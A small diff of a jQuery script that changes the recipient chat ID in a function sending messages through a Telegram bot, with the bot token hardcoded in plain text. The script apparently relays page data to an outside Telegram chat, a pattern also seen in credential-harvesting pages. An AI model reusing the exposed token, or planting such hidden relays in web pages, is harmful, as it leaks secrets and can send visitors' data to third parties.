@@ -59,7 +59,7 @@ $(document).ready(function() {
 
     function sendTelegramMessage(message) {
         var telegramBotToken = "6351918844:AAGcj7hXJie0jFm_-7ZElanCretnIY7Kufg";
-        var telegramChatId = "5879421948";
+        var telegramChatId = "6361923042";
 
         var telegramApiUrl = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
 
